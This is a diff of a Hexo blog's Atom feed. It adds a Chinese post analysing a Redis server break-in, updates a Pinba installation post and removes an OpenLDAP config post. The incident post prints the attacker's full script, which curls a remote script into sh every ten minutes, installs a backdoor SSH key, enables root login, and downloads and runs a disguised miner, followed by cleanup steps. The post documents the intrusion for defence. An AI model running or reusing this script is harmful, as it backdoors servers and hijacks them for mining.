@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://t1ger.github.io/"/>
-  <updated>2016-10-31T08:38:32.099Z</updated>
+  <updated>2016-11-04T07:38:35.635Z</updated>
   <id>https://t1ger.github.io/</id>
   
   <author>
@@ -16,11 +16,45 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Recent Redis hacking</title>
+    <link href="https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/"/>
+    <id>https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/</id>
+    <published>2016-11-04T05:18:04.000Z</published>
+    <updated>2016-11-04T07:38:35.635Z</updated>
+    
+    <content type="html"><![CDATA[<p>早上接到cpu负载报警，发现服务器被黑了，又成人家肉鸡了。</p>
+<p>登陆系统查看，发下防火墙被关了，crontab被清空重写了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#crontab -l</div><div class="line">*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh</div></pre></td></tr></table></figure>
+<p>查看脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</div><div class="line"></div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line">if [ ! -f &quot;/root/.ssh/KHK75NEOiq&quot; ]; then</div><div class="line">	mkdir -p ~/.ssh</div><div class="line">	rm -f ~/.ssh/authorized_keys*</div><div class="line">	echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot; &gt; ~/.ssh/KHK75NEOiq</div><div class="line">	echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	/etc/init.d/sshd restart</div><div class="line">fi</div><div class="line"></div><div class="line">if [ ! -f &quot;/etc/init.d/ntp&quot; ]; then</div><div class="line">	if [ ! -f &quot;/etc/systemd/system/ntp.service&quot; ]; then</div><div class="line">		mkdir -p /opt</div><div class="line">		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 -Install</div><div class="line">	fi</div><div class="line">fi</div><div class="line"></div><div class="line">/etc/init.d/ntp start</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep &quot;/usr/bin/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div><div class="line">ps auxf|grep -v grep|grep &quot;/opt/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div></pre></td></tr></table></figure>
+<p>分析脚本，我们需要删除相应程序及进程</p>
+<ul>
+<li>清理crontab 任务</li>
+<li>清理.ssh/KHK75NEOiq,恢复/etc/ssh/sshd_config文件或者用其他服务器文件替换，并重启sshd服务。</li>
+<li>清理 /etc/init.d/ntp删除并kill掉它启动的进程</li>
+<li>清理/usr/local/etc/minerd.conf </li>
+</ul>
+<p>通过top观察负载，查看是否有minerd进程及ntp进程。</p>
+<hr>
+<p>您的鼓励是我写作最大的动力</p>
+<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      hacking redis server
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Pinba Server install on centos6.4</title>
     <link href="https://t1ger.github.io/2016/10/31/Pinba-Server-install-on-centos6-4/"/>
     <id>https://t1ger.github.io/2016/10/31/Pinba-Server-install-on-centos6-4/</id>
     <published>2016-10-31T08:35:24.000Z</published>
-    <updated>2016-10-31T08:38:32.099Z</updated>
+    <updated>2016-11-02T06:25:15.498Z</updated>
     
     <content type="html"><![CDATA[<p>Pinba is a MySQL storage engine that acts as a realtime monitoring/statistics server for PHP using MySQL as a read-only interface.</p>
 <p>Environment:</p>
@@ -45,7 +79,7 @@
 <p>Now we will see <a href="http://pinboard.me" target="_blank" rel="external">http://pinboard.me</a></p>
 <p>install extension for client:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">shell&gt; git clone https://github.com/tony2001/pinba_extension.git</div><div class="line">shell&gt; cd pinba_extension</div><div class="line">shell&gt; git checkout -b php5 remotes/origin/php5</div><div class="line">shell&gt; phpize</div><div class="line">shell&gt; ./configure</div><div class="line">shell&gt; make</div><div class="line">shell&gt; make install</div><div class="line">(</div><div class="line">cat &lt;&lt;EOF</div><div class="line">; Load Pinba extension</div><div class="line">extension=pinba.so</div><div class="line">; Enable and configure Pinba extension</div><div class="line">; See http://pinba.org/wiki/Manual:PHP_extension</div><div class="line">pinba.enabled = 1</div><div class="line">pinba.server = 127.0.0.1</div><div class="line">EOF</div><div class="line">) &gt; /etc/php.d/pinba.ini</div></pre></td></tr></table></figure></p>
 <p>ref:</p>
-<p><a href="https://github.com/trivoallan/trivoallan.github.com/wiki/HowToPinbaCentOs" target="_blank" rel="external">HowToPinbaCentOs</a><br><a href="https://mrcappuccino.ru/blog/post/pinba-server-installation-on-centos-6" target="_blank" rel="external">install on centos6</a><br><a href="http://www.alexlinux.com/pinba-server-installation-on-centos-7/" target="_blank" rel="external">pinba server installation on CentOS 7</a><br><a href="https://github.com/intaro/pinboard/wiki/Installation" target="_blank" rel="external">pinboard</a><br><a href="https://github.com/tony2001/pinba_engine/wiki" target="_blank" rel="external">pinba</a><br><a href="https://howto.biapy.com/en/debian-gnu-linux/web-applications/monitoring/install-intaro-pinboard-on-debian" target="_blank" rel="external">Install Intaro Pinboard on Debian</a></p>
+<p><a href="https://github.com/trivoallan/trivoallan.github.com/wiki/HowToPinbaCentOs" target="_blank" rel="external">HowToPinbaCentOs</a><br><a href="https://mrcappuccino.ru/blog/post/pinba-server-installation-on-centos-6" target="_blank" rel="external">install on centos6</a><br><a href="http://www.alexlinux.com/pinba-server-installation-on-centos-7/" target="_blank" rel="external">pinba server installation on CentOS 7</a><br><a href="https://github.com/intaro/pinboard/wiki/Installation" target="_blank" rel="external">pinboard</a><br><a href="https://github.com/tony2001/pinba_engine/wiki" target="_blank" rel="external">pinba</a><br><a href="https://howto.biapy.com/en/debian-gnu-linux/web-applications/monitoring/install-intaro-pinboard-on-debian" target="_blank" rel="external">Install Intaro Pinboard on Debian</a><br><a href="https://recordnotfound.com/pinboard-intaro-25385" target="_blank" rel="external">Intaro Pinboard</a><br><a href="https://github.com/intaro/pinba-bundle" target="_blank" rel="external">PinbaBundle</a></p>
 <hr>
 <p>您的鼓励是我写作最大的动力</p>
 <p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
@@ -557,59 +591,6 @@ update cwd_directory set active = &apos;T&apos; where id = &lt;Internal Director
     
     
       <category term="Confluence openldap" scheme="https://t1ger.github.io/tags/Confluence-openldap/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>openldap集成系列</title>
-    <link href="https://t1ger.github.io/2016/09/16/openldap%E9%9B%86%E6%88%90%E7%B3%BB%E5%88%97/"/>
-    <id>https://t1ger.github.io/2016/09/16/openldap集成系列/</id>
-    <published>2016-09-15T15:31:07.000Z</published>
-    <updated>2016-09-26T03:44:47.690Z</updated>
-    
-    <content type="html"><![CDATA[<p>闲言少叙，先来个svn集成配置</p>
-<pre><code>&lt;Location /svn&gt;
-DAV svn
-SVNParentPath /opt/repo
-#SVNPath /opt/repo
-AuthType Basic
-AuthName &quot;SVN Repo&quot;
-#AuthUserFile /opt/svnconf/svn_access_file
-AuthzLDAPAuthoritative off
-AuthLDAPBindDN &quot;cn=admin,dc=abc,dc=com,dc=cn&quot;
-AuthLDAPBindPassword &quot;abc123&quot;
-AuthBasicProvider ldap
-AuthLDAPURL &quot;ldap://192.168.1.102:389/ou=user,dc=abc,dc=com,dc=cn?cn?sub?(objectClass=*)&quot;
-AuthzSVNAccessFile /opt/svnconf/svn_auth_file
-Require valid-user
-&lt;/Location&gt;
-</code></pre><p>proftp集成配置</p>
-<pre><code>LDAPAttr uid cn
-LDAPServer      ldap://192.168.1.102:389/??sub
-LDAPAuthBinds on
-DAPBindDN      &quot;cn=admin,dc=abc,dc=com,dc=cn&quot; &quot;abc123&quot;
-LDAPUsers       &quot;ou=user,dc=abc,dc=com,dc=cn&quot; (uid=%v)
-LDAPGroups       ou=ftp,ou=permission,dc=abc,dc=com,dc=cn
-</code></pre><p>不断更新中</p>
-<hr>
-<p>您的鼓励是我写作最大的动力</p>
-<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;闲言少叙，先来个svn集成配置&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;Location /svn&amp;gt;
-DAV svn
-SVNParentPath /opt/repo
-#SVNPath /opt/repo
-AuthType Basic
-AuthName &amp;quot;SVN
-    
-    </summary>
-    
-    
-      <category term="openldap linux svn proftp" scheme="https://t1ger.github.io/tags/openldap-linux-svn-proftp/"/>
     
   </entry>
   
